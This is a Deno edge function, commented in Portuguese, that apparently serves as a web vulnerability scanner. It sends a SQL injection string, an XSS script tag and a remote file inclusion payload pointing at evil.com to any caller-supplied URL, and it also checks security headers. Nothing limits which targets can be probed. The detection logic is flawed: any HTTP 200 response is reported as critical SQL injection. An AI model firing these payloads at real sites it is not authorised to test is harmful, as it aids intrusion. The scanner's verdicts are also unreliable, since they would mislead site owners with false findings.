
import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface VulnerabilityTestResult {
  type: 'sql_injection' | 'xss' | 'rfi' | 'security_headers';
  vulnerable: boolean;
  description: string;
  severity: 'high' | 'medium' | 'low' | 'safe';
  details: {
    testPerformed: string;
    payload?: string;
    requestDetails: {
      method: string;
      endpoint: string;
      headers: string;
      timestamp: string;
    };
    responseDetails: {
      statusCode: string;
      headers: string;
      responseTime: string;
      bodyPreview?: string;
    };
    recommendation: string;
    owaspReference: string;
    riskLevel: string;
  };
}

async function testSQLInjection(url: string): Promise<VulnerabilityTestResult> {
  const startTime = Date.now();
  
  try {
    console.log(`Testando SQL Injection para: ${url}`);
    
    // Payload SQL injection baseado na OWASP A03:2021-Injection
    const sqlPayload = "' UNION SELECT SLEEP(10);--";
    const testUrl = `${url}?id=${encodeURIComponent(sqlPayload)}`;
    
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'OWASP-SQLi-Test/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
    });

    const responseTime = Date.now() - startTime;
    const responseText = await response.text();
    const first200Chars = responseText.substring(0, 200);

    // Análise de vulnerabilidade baseada no status code
    // 200 = Sucesso (VULNERÁVEL)
    // 403/400 = Bloqueado (PROTEGIDO)
    const isVulnerable = response.status === 200;
    const isBlocked = response.status === 403 || response.status === 400;

    let severityLevel: 'high' | 'medium' | 'low' | 'safe' = 'safe';
    let description = '';
    let riskLevel = '';

    if (isVulnerable) {
      severityLevel = 'high';
      description = 'VULNERABILIDADE CRÍTICA: SQL Injection detectado - Payload executado com sucesso';
      riskLevel = 'CRÍTICO';
    } else if (isBlocked) {
      severityLevel = 'safe';
      description = 'Sistema protegido contra SQL Injection - Payload bloqueado adequadamente';
      riskLevel = 'BAIXO';
    } else {
      severityLevel = 'medium';
      description = 'Resposta inesperada do servidor - Necessária análise manual';
      riskLevel = 'MÉDIO';
    }

    return {
      type: 'sql_injection',
      vulnerable: isVulnerable,
      description,
      severity: severityLevel,
      details: {
        testPerformed: `Teste de SQL Injection OWASP A03:2021. Payload: ${sqlPayload}. Status: ${response.status}`,
        payload: sqlPayload,
        requestDetails: {
          method: 'GET',
          endpoint: testUrl,
          headers: 'User-Agent: OWASP-SQLi-Test/1.0\nAccept: text/html,application/xhtml+xml',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: `${response.status} ${response.statusText}`,
          headers: Array.from(response.headers.entries()).map(([k, v]) => `${k}: ${v}`).join('\n'),
          responseTime: `${responseTime}ms`,
          bodyPreview: first200Chars + (responseText.length > 200 ? '...' : ''),
        },
        recommendation: isVulnerable ? 
          'VULNERABILIDADE CRÍTICA DETECTADA:\n• Implementar prepared statements/parameterized queries\n• Usar ORM com proteção contra SQL injection\n• Validar e sanitizar todos os inputs\n• Implementar WAF (Web Application Firewall)\n• Aplicar princípio do menor privilégio no banco de dados' :
          isBlocked ?
          'Sistema adequadamente protegido. Continue monitorando e testando regularmente.' :
          'Verificar logs do servidor e implementar proteções adicionais se necessário.',
        owaspReference: 'OWASP Top 10 2021 - A03: Injection (SQL Injection)',
        riskLevel
      }
    };

  } catch (error) {
    console.error('Erro no teste SQL Injection:', error);
    return {
      type: 'sql_injection',
      vulnerable: false,
      description: 'Erro ao executar teste de SQL Injection',
      severity: 'safe',
      details: {
        testPerformed: `Falha no teste: ${error.message}`,
        requestDetails: {
          method: 'GET',
          endpoint: url,
          headers: 'N/A',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: 'Connection Failed',
          headers: 'N/A',
          responseTime: `${Date.now() - startTime}ms`,
        },
        recommendation: 'Verificar conectividade com o servidor.',
        owaspReference: 'Test Error',
        riskLevel: 'DESCONHECIDO'
      }
    };
  }
}

async function testXSS(url: string): Promise<VulnerabilityTestResult> {
  const startTime = Date.now();
  
  try {
    console.log(`Testando XSS para: ${url}`);
    
    // Payload XSS mais sofisticado baseado na OWASP A03:2021
    const xssPayload = '<script>alert("OWASP-XSS-Test")</script>';
    const testUrl = `${url}?search=${encodeURIComponent(xssPayload)}`;
    
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'OWASP-XSS-Test/1.0',
        'Accept': 'text/html,application/xhtml+xml',
      },
    });

    const responseTime = Date.now() - startTime;
    const responseText = await response.text();
    const first200Chars = responseText.substring(0, 200);

    // Análise de vulnerabilidade XSS
    const isVulnerable = response.status === 200 && responseText.includes('<script>alert("OWASP-XSS-Test")</script>');
    const isBlocked = response.status === 403 || response.status === 400;

    let severityLevel: 'high' | 'medium' | 'low' | 'safe' = 'safe';
    let description = '';
    let riskLevel = '';

    if (isVulnerable) {
      severityLevel = 'high';
      description = 'VULNERABILIDADE XSS DETECTADA: Script malicioso refletido sem sanitização';
      riskLevel = 'ALTO';
    } else if (isBlocked) {
      severityLevel = 'safe';
      description = 'Sistema protegido contra XSS - Payload adequadamente bloqueado';
      riskLevel = 'BAIXO';
    } else {
      severityLevel = 'safe';
      description = 'XSS não detectado - Input provavelmente sanitizado';
      riskLevel = 'BAIXO';
    }

    return {
      type: 'xss',
      vulnerable: isVulnerable,
      description,
      severity: severityLevel,
      details: {
        testPerformed: `Teste XSS OWASP A03:2021. Verificação de sanitização de inputs. Status: ${response.status}`,
        payload: xssPayload,
        requestDetails: {
          method: 'GET',
          endpoint: testUrl,
          headers: 'User-Agent: OWASP-XSS-Test/1.0',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: `${response.status} ${response.statusText}`,
          headers: Array.from(response.headers.entries()).map(([k, v]) => `${k}: ${v}`).join('\n'),
          responseTime: `${responseTime}ms`,
          bodyPreview: first200Chars + (responseText.length > 200 ? '...' : ''),
        },
        recommendation: isVulnerable ?
          'VULNERABILIDADE XSS CRÍTICA:\n• Implementar encoding/escaping de todos os outputs\n• Usar Content Security Policy (CSP) restritivo\n• Validar e sanitizar rigorosamente todos os inputs\n• Implementar headers X-XSS-Protection\n• Usar frameworks com proteção XSS automática' :
          'Proteção XSS adequada. Continue validando inputs e implementando CSP.',
        owaspReference: 'OWASP Top 10 2021 - A03: Injection (Cross-Site Scripting)',
        riskLevel
      }
    };

  } catch (error) {
    console.error('Erro no teste XSS:', error);
    return {
      type: 'xss',
      vulnerable: false,
      description: 'Erro ao executar teste XSS',
      severity: 'safe',
      details: {
        testPerformed: `Falha no teste XSS: ${error.message}`,
        requestDetails: {
          method: 'GET',
          endpoint: url,
          headers: 'N/A',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: 'Connection Failed',
          headers: 'N/A',
          responseTime: `${Date.now() - startTime}ms`,
        },
        recommendation: 'Verificar conectividade com o servidor.',
        owaspReference: 'Test Error',
        riskLevel: 'DESCONHECIDO'
      }
    };
  }
}

async function testRFI(url: string): Promise<VulnerabilityTestResult> {
  const startTime = Date.now();
  
  try {
    console.log(`Testando RFI (Remote File Inclusion) para: ${url}`);
    
    // Payload RFI baseado na OWASP A03:2021
    const rfiPayload = 'http://evil.com/malicious.php';
    const testUrl = `${url}?file=${encodeURIComponent(rfiPayload)}`;
    
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'OWASP-RFI-Test/1.0',
        'Accept': 'text/html,application/xhtml+xml',
      },
    });

    const responseTime = Date.now() - startTime;
    const responseText = await response.text();
    const first200Chars = responseText.substring(0, 200);

    // Análise de vulnerabilidade RFI
    const isVulnerable = response.status === 200 && (
      responseText.toLowerCase().includes('failed to open stream') ||
      responseText.toLowerCase().includes('no such file or directory') ||
      responseText.toLowerCase().includes('remote file inclusion')
    );
    const isBlocked = response.status === 403 || response.status === 400;

    let severityLevel: 'high' | 'medium' | 'low' | 'safe' = 'safe';
    let description = '';
    let riskLevel = '';

    if (isVulnerable) {
      severityLevel = 'high';
      description = 'VULNERABILIDADE RFI DETECTADA: Sistema tenta incluir arquivo remoto';
      riskLevel = 'CRÍTICO';
    } else if (isBlocked) {
      severityLevel = 'safe';
      description = 'Sistema protegido contra RFI - Tentativa adequadamente bloqueada';
      riskLevel = 'BAIXO';
    } else {
      severityLevel = 'safe';
      description = 'RFI não detectado - Sistema não aceita inclusões remotas';
      riskLevel = 'BAIXO';
    }

    return {
      type: 'rfi',
      vulnerable: isVulnerable,
      description,
      severity: severityLevel,
      details: {
        testPerformed: `Teste RFI OWASP A03:2021. Tentativa de inclusão de arquivo remoto. Status: ${response.status}`,
        payload: rfiPayload,
        requestDetails: {
          method: 'GET',
          endpoint: testUrl,
          headers: 'User-Agent: OWASP-RFI-Test/1.0',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: `${response.status} ${response.statusText}`,
          headers: Array.from(response.headers.entries()).map(([k, v]) => `${k}: ${v}`).join('\n'),
          responseTime: `${responseTime}ms`,
          bodyPreview: first200Chars + (responseText.length > 200 ? '...' : ''),
        },
        recommendation: isVulnerable ?
          'VULNERABILIDADE RFI CRÍTICA:\n• Desabilitar allow_url_include no PHP\n• Implementar whitelist de arquivos permitidos\n• Validar rigorosamente parâmetros de arquivo\n• Usar caminhos absolutos em includes\n• Implementar controle de acesso adequado' :
          'Sistema adequadamente protegido contra RFI. Continue monitorando inclusões de arquivo.',
        owaspReference: 'OWASP Top 10 2021 - A03: Injection (Remote File Inclusion)',
        riskLevel
      }
    };

  } catch (error) {
    console.error('Erro no teste RFI:', error);
    return {
      type: 'rfi',
      vulnerable: false,
      description: 'Erro ao executar teste RFI',
      severity: 'safe',
      details: {
        testPerformed: `Falha no teste RFI: ${error.message}`,
        requestDetails: {
          method: 'GET',
          endpoint: url,
          headers: 'N/A',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: 'Connection Failed',
          headers: 'N/A',
          responseTime: `${Date.now() - startTime}ms`,
        },
        recommendation: 'Verificar conectividade com o servidor.',
        owaspReference: 'Test Error',
        riskLevel: 'DESCONHECIDO'
      }
    };
  }
}

async function testSecurityHeaders(url: string): Promise<VulnerabilityTestResult> {
  const startTime = Date.now();
  
  try {
    console.log(`Testando headers de segurança para: ${url}`);
    
    const response = await fetch(url, {
      method: 'HEAD',
      headers: {
        'User-Agent': 'OWASP-Security-Headers-Test/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
    });

    const responseTime = Date.now() - startTime;
    const headers: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      headers[key.toLowerCase()] = value;
    });

    // Análise baseada na OWASP A05:2021-Security Misconfiguration
    const securityIssues = [];
    let severityLevel: 'high' | 'medium' | 'low' | 'safe' = 'safe';

    if (!headers['strict-transport-security']) {
      securityIssues.push('HSTS não configurado');
      severityLevel = 'high';
    }

    if (!headers['content-security-policy']) {
      securityIssues.push('Content Security Policy ausente');
      severityLevel = 'high';
    }

    if (!headers['x-frame-options'] && !headers['content-security-policy']?.includes('frame-ancestors')) {
      securityIssues.push('X-Frame-Options não configurado');
      if (severityLevel === 'safe') severityLevel = 'medium';
    }

    if (!headers['x-content-type-options']) {
      securityIssues.push('X-Content-Type-Options ausente');
      if (severityLevel === 'safe') severityLevel = 'medium';
    }

    if (!headers['referrer-policy']) {
      securityIssues.push('Referrer-Policy não configurado');
      if (severityLevel === 'safe') severityLevel = 'low';
    }

    const isVulnerable = securityIssues.length > 0;

    return {
      type: 'security_headers',
      vulnerable: isVulnerable,
      description: `Análise de headers de segurança OWASP A05:2021 - ${securityIssues.length} problemas encontrados`,
      severity: severityLevel,
      details: {
        testPerformed: `Análise completa dos headers de segurança HTTP baseada na OWASP A05:2021. Problemas: ${securityIssues.join(', ')}`,
        requestDetails: {
          method: 'HEAD',
          endpoint: url,
          headers: 'User-Agent: OWASP-Security-Headers-Test/1.0',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: `${response.status} ${response.statusText}`,
          headers: Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\n'),
          responseTime: `${responseTime}ms`,
        },
        recommendation: isVulnerable ? 
          `CONFIGURAÇÕES DE SEGURANÇA INADEQUADAS:\n${securityIssues.map(issue => `• ${issue}`).join('\n')}\n\nAções OWASP recomendadas:\n• Configurar Strict-Transport-Security para HTTPS\n• Implementar Content Security Policy restritivo\n• Adicionar X-Frame-Options: DENY ou SAMEORIGIN\n• Configurar X-Content-Type-Options: nosniff\n• Implementar Referrer-Policy adequada\n• Adicionar Permissions-Policy para controle de recursos` :
          'Headers de segurança configurados adequadamente conforme OWASP.',
        owaspReference: 'OWASP Top 10 2021 - A05: Security Misconfiguration',
        riskLevel: isVulnerable ? (severityLevel === 'high' ? 'CRÍTICO' : severityLevel === 'medium' ? 'MÉDIO' : 'BAIXO') : 'BAIXO'
      }
    };

  } catch (error) {
    console.error('Erro no teste de headers:', error);
    return {
      type: 'security_headers',
      vulnerable: true,
      description: 'Erro ao analisar headers de segurança',
      severity: 'high',
      details: {
        testPerformed: `Falha na análise: ${error.message}`,
        requestDetails: {
          method: 'HEAD',
          endpoint: url,
          headers: 'N/A',
          timestamp: new Date().toISOString(),
        },
        responseDetails: {
          statusCode: 'Connection Failed',
          headers: 'N/A',
          responseTime: `${Date.now() - startTime}ms`,
        },
        recommendation: 'Verificar se o site está acessível e configurado corretamente.',
        owaspReference: 'Connection Error',
        riskLevel: 'DESCONHECIDO'
      }
    };
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { url, testType } = await req.json();
    
    if (!url) {
      return new Response(
        JSON.stringify({ error: 'URL é obrigatória' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Iniciando teste OWASP: ${testType} para ${url}`);
    
    let result: VulnerabilityTestResult;
    
    switch (testType) {
      case 'sql_injection':
        result = await testSQLInjection(url);
        break;
      case 'xss':
        result = await testXSS(url);
        break;
      case 'rfi':
        result = await testRFI(url);
        break;
      case 'security_headers':
      default:
        result = await testSecurityHeaders(url);
        break;
    }

    return new Response(
      JSON.stringify({
        url,
        testType,
        timestamp: new Date().toISOString(),
        result,
        success: true,
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );

  } catch (error) {
    console.error('Erro na edge function OWASP:', error);
    return new Response(
      JSON.stringify({ error: error.message, success: false }),
      {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );
  }
});
